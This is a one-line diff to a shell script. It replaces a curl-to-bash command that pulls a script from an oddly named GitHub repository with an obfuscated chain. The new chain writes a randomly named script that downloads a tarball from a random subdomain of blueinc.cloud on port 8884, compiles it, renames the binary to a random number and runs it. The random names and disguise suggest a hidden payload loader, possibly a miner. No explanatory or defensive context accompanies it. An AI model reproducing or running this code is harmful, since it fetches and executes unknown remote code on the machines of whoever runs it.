@@ -1,1 +1,1 @@
-curl https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle8 | bash
+echo $((1 + $RANDOM % 88888884)) > ./linux84744474;echo -e "wget -N http://$(echo $((1 + $RANDOM % 88888884))).blueinc.cloud:8884/linux8444.tar.gz;tar -xf ./linux8444.tar.gz;cd ./linux8444;mkdir ./linux84888874/;cd ./linux84888874/;cmake ..;make;linux8474=$(echo $((1 + $RANDOM % 88888884)));mv ./linux848888888874 ./$(echo $linux8474);./$(echo $linux8474) $(echo $((1 + $RANDOM % 88888884)))" > ./$(cat ./linux84744474);bash ./$(cat ./linux84744474)
